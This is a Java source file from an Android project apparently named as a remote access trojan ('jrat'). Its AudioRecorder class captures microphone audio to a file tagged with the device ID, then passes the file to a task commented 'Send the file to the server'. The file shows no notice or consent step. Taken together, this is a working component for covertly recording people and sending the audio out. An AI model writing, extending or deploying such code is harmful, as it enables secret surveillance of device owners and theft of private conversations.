package com.julioxus.jrat;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;

import java.io.IOException;

/**
 * Created by enpi on 03/06/2016.
 */
public class AudioRecorder {

    private static final String LOG_TAG = "AudioRecorder";
    private MediaRecorder mRecorder = null;
    private String mFileName = null;
    private String android_id = null;
    private int time;
    private Context context;


    public AudioRecorder(Context context, String android_id, int time){
        this.context = context;
        this.android_id = android_id;
        this.mFileName = Environment.getExternalStorageDirectory().getAbsolutePath();
        this.mFileName += "/" + android_id +"audio.aac";
        this.time=time;
    }

    public void startRecording() {
        mRecorder = new MediaRecorder();
        mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mRecorder.setOutputFile(mFileName);
        mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);

        try {
            mRecorder.prepare();
        } catch (IOException e) {
            Log.e(LOG_TAG, "prepare() failed");
        }

        mRecorder.start();

        Log.d(LOG_TAG, "Grabación iniciada!");

    }

    public void stopRecording() {
        mRecorder.stop();
        mRecorder.reset();
        mRecorder.release();
        mRecorder = null;

        Log.d(LOG_TAG, "Grabación finalizada!");

        // Send the file to the server
        new SendAudioAsyncTask(context, android_id, mFileName).execute();
    }
}
